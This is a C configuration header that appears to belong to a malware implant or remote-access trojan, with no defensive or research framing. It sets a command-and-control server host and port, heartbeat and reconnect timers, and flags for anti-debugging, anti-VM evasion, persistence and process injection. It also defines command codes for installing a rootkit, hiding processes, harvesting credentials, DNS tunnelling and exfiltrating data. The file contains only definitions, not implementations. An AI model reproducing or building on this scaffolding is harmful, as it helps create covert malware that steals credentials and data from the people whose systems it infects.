/*
 * Configuration and Global Definitions
 */

#ifndef CONFIG_H
#define CONFIG_H

#include <stdint.h>
#include <stddef.h>

// Version
#define PAYLOAD_VERSION "1.0.0"

// Connection settings (can be overridden at compile time)
#ifndef SERVER_HOST
#define SERVER_HOST "127.0.0.1"
#endif

#ifndef SERVER_PORT
#define SERVER_PORT 4433
#endif

// Buffer sizes
#define MAX_PACKET_SIZE 4096
#define MAX_COMMAND_SIZE 512
#define MAX_PATH_SIZE 260

// Timing
#define RECONNECT_DELAY 2000  // ms
#define HEARTBEAT_INTERVAL 30000  // ms
#define COMMAND_TIMEOUT 30000  // ms

// Features (can be disabled for smaller size)
#define ENABLE_ANTI_DEBUG 1
#define ENABLE_ANTI_VM 1
#define ENABLE_PERSISTENCE 1
#define ENABLE_INJECTION 1

// Platform detection
#if defined(_WIN32) || defined(_WIN64)
    #define PLATFORM_WINDOWS 1
    #define PLATFORM_NAME "Windows"
#elif defined(__APPLE__) || defined(__MACH__)
    #define PLATFORM_MACOS 1
    #define PLATFORM_NAME "macOS"
#elif defined(__linux__)
    #define PLATFORM_LINUX 1
    #define PLATFORM_NAME "Linux"
#else
    #error "Unsupported platform"
#endif

// Export/Import helpers
#ifdef PLATFORM_WINDOWS
    #define EXPORT __declspec(dllexport)
    #define IMPORT __declspec(dllimport)
#else
    #define EXPORT __attribute__((visibility("default")))
    #define IMPORT
#endif

// Function attributes
#define INLINE static inline __attribute__((always_inline))
#define NOINLINE __attribute__((noinline))
#define NORETURN __attribute__((noreturn))
#define PACKED __attribute__((packed))
#define UNUSED __attribute__((unused))
#define HIDDEN __attribute__((visibility("hidden")))

// Security attributes
#define SECURE_ZERO(ptr, size) do { \
    volatile unsigned char *_p = (volatile unsigned char *)(ptr); \
    size_t _s = (size); \
    while (_s--) *_p++ = 0; \
} while(0)

// Additional error codes not in utils.h
#ifndef ERR_NETWORK
#define ERR_NETWORK -7
#endif

// Command types - Phase 3 (additional commands)
#ifndef CMD_INSTALL_ROOTKIT
#define CMD_INSTALL_ROOTKIT 0x20
#define CMD_GHOST_PROCESS 0x21
#define CMD_HARVEST_CREDS 0x22
#define CMD_SETUP_DNS_TUNNEL 0x23
#define CMD_PERSIST_FULL 0x24
#define CMD_EXFILTRATE 0x25
#endif

// Command packet structure
typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint16_t cmd_id;
    uint16_t data_len;
    uint8_t data[];
} command_packet_t;

#endif // CONFIG_H

